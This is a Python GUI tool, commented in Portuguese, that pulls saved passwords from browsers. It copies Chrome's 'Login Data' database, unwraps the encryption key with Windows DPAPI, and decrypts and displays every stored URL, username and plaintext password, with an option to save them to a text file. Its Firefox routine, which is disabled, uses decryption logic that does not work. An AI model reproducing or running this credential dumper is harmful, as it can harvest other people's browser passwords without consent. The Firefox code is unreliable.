import os
import sqlite3
import win32crypt
import shutil
import json
from tkinter import filedialog, Tk, Text, END, Button, Label
from tkinter.scrolledtext import ScrolledText
from Cryptodome.Cipher import AES
import base64
import traceback
from Cryptodome.Protocol.KDF import PBKDF2
import hashlib
import binascii
import csv

# Caminho padrão para o arquivo Login Data do Chrome
chrome_login_data_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Default\Login Data')
# Caminho padrão para o arquivo Logins do Firefox
firefox_profile_path = os.path.join(os.environ['APPDATA'], r'Mozilla\Firefox\Profiles')

def get_encryption_key(local_state_path):
    with open(local_state_path, "r") as file:
        local_state = json.load(file)

    # Decodificar a chave de criptografia
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
    return decrypted_key

def decrypt_password(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(password)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Desconhecido"

def fetch_saved_passwords_chrome(login_data_path, text_widget):
    local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State')
    encryption_key = get_encryption_key(local_state_path)

    shutil.copyfile(login_data_path, "LoginData_copy.db")
    
    conn = sqlite3.connect("LoginData_copy.db")
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    for row in cursor.fetchall():
        url = row[0]
        username = row[1] if row[1] else "N/A"
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, encryption_key) if encrypted_password else "N/A"
        text_widget.insert(END, f"Chrome\n\nURL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")
    
    cursor.close()
    conn.close()
    os.remove("LoginData_copy.db")

def fetch_saved_passwords_firefox(text_widget):
    profiles = [d for d in os.listdir(firefox_profile_path) if os.path.isdir(os.path.join(firefox_profile_path, d))]
    if not profiles:
        text_widget.insert(END, "Nenhum perfil do Firefox encontrado.\n")
        return

    firefox_passwords = []

    for profile in profiles:
        profile_path = os.path.join(firefox_profile_path, profile)
        logins_json_path = os.path.join(profile_path, "logins.json")
        key4_db_path = os.path.join(profile_path, "key4.db")

        if os.path.exists(logins_json_path) and os.path.exists(key4_db_path):
            with open(logins_json_path, "r") as file:
                logins_data = json.load(file)

            for login in logins_data.get("logins", []):
                url = login.get("hostname", "")
                username = login.get("username", "N/A")
                encrypted_password = login.get("password", "")
                
                if encrypted_password:
                    decrypted_password = decrypt_firefox_password(encrypted_password, key4_db_path)
                else:
                    decrypted_password = "N/A"

                text_widget.insert(END, f"Firefox\nURL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")
                firefox_passwords.append([url, username, decrypted_password])

    if firefox_passwords:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(script_dir, "senhas.csv"), "w", newline='', encoding='utf-8') as csv_file:
            writer = csv.writer(csv_file)
            writer.writerow(["URL", "Username", "Password"])
            writer.writerows(firefox_passwords)

def decrypt_firefox_password(encrypted_password, key4_db_path):
    try:
        conn = sqlite3.connect(key4_db_path)
        cursor = conn.cursor()

        cursor.execute("SELECT item1, item2 FROM metadata WHERE id='password'")
        key_data = cursor.fetchone()

        if not key_data:
            return "Erro ao obter chave"

        master_password = key_data[0]
        salt = key_data[1]

        key = PBKDF2(master_password, salt, 32, 1003, hashlib.sha256)

        cipher = AES.new(key, AES.MODE_GCM)
        decrypted_password = cipher.decrypt(encrypted_password)

        return decrypted_password.decode()
    except Exception as e:
        print(traceback.format_exc())
        return "Desconhecido"

def open_file_dialog(text_widget, label_path):
    file_path = filedialog.askopenfilename(title="Selecione o arquivo Login Data ou senhas.csv",
                                           filetypes=[("All Files", "*.*")])
    if file_path:
        text_widget.delete("1.0", END)
        label_path.config(text=f"Caminho do arquivo: {file_path}")
        
        if file_path.endswith(".db"):
            fetch_saved_passwords_chrome(file_path, text_widget)
        elif file_path.endswith(".csv"):
            show_saved_passwords_csv(file_path, text_widget)
        else:
            text_widget.insert(END, "Tipo de arquivo não reconhecido.\n")

def save_to_file(text_widget):
    file_path = filedialog.asksaveasfilename(defaultextension=".txt", 
                                             filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
    if file_path:
        with open(file_path, "w") as file:
            file.write(text_widget.get("1.0", END))

def load_default_passwords(text_widget):
    text_widget.delete("1.0", END)
    if os.path.exists(chrome_login_data_path):
        fetch_saved_passwords_chrome(chrome_login_data_path, text_widget)
    else:
        text_widget.insert(END, "Caminho padrão do Chrome não encontrado.\n")
    
    # Remover a chamada para a função do Firefox
    # fetch_saved_passwords_firefox(text_widget)

def show_saved_passwords_csv(file_path, text_widget):
    text_widget.delete("1.0", END)
    text_widget.insert(END, "Firefox\n")  # Adiciona título "Firefox"
    if os.path.exists(file_path):
        with open(file_path, "r", encoding='utf-8') as csv_file:
            reader = csv.reader(csv_file)
            next(reader)  # Pular o cabeçalho
            for row in reader:
                text_widget.insert(END, f"\nURL: {row[0]}\nUsername: {row[1]}\nPassword: {row[2]}\n\n")
    else:
        text_widget.insert(END, "Arquivo senhas.csv não encontrado.\n")

if __name__ == "__main__":
    root = Tk()
    root.title("Decriptografar Senhas do Chrome e Firefox")
    root.geometry("1200x960")    

    if os.path.exists(chrome_login_data_path):
        initial_path = chrome_login_data_path
    else:
        initial_path = "Caminho padrão do Chrome não encontrado"

    label_caminho = Label(root, text=initial_path, font=("TkDefaultFont", 10, "bold"))
    label_caminho.pack(pady=5)

    btn_carregar_auto = Button(root, text="Carregar Automaticamente", command=lambda: load_default_passwords(saida_texto), font=("TkDefaultFont", 11, "bold"), bg='#07f5c1')
    btn_carregar_auto.pack(pady=5)

    btn_selecionar = Button(root, text="Selecionar Login Data ou senhas.csv", 
                            command=lambda: open_file_dialog(saida_texto, label_caminho), 
                            font=("TkDefaultFont", 11, "bold"), bg='#07f5c1')
    btn_selecionar.pack(pady=5)

    btn_salvar = Button(root, text="Salvar em arquivo .txt", command=lambda: save_to_file(saida_texto), font=("TkDefaultFont", 11, "bold"), bg='#eb4034')
    btn_salvar.pack(pady=5)

    saida_texto = ScrolledText(root, wrap="word", width=120, height=40, font=("TkDefaultFont", 11, "bold"))
    saida_texto.pack(pady=5)

    root.mainloop()
